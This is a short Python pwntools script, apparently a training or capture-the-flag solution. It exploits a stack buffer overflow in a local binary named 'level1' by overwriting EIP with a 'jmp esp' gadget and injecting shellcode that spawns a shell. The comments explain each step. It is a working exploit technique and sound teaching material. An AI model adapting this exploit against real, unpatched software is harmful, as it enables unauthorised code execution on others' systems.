# Import everything in the pwntools namespace
from pwn import *

# Create an instance of the process to talk to
io = gdb.debug('./level1')

# Attach a debugger to the process so that we can step through
pause()

# Load a copy of the binary so that we can find a JMP ESP
binary = ELF('./level1')

# Assemble the byte sequence for 'jmp esp' so we can search for it
jmp_esp = asm('jmp esp')
jmp_esp = next(binary.search(jmp_esp))

log.info("Found jmp esp at %#x" % jmp_esp)

# Overflow the buffer with a cyclic pattern to make it easy to find offsets
#
# If we let the program crash with just the pattern as input, the register
# state will look something like this:
#
#  EBP  0x6161616b ('kaaa')
# *ESP  0xff84be30 <-- 'maaanaaaoaaapaaaqaaar...'
# *EIP  0x6161616c ('laaa')
crash = False

if crash:
    pattern = cyclic(512)
    io.sendline(pattern)
    pause()
    sys.exit()

# Fill out the buffer until where we control EIP
exploit = cyclic(cyclic_find(0x6161616c))

# Fill the spot we control EIP with a 'jmp esp'
exploit += pack(jmp_esp)

# Add our shellcode
exploit += asm(shellcraft.sh())

# gets() waits for a newline
io.sendline(exploit)

# Enjoy our shell
io.interactive()
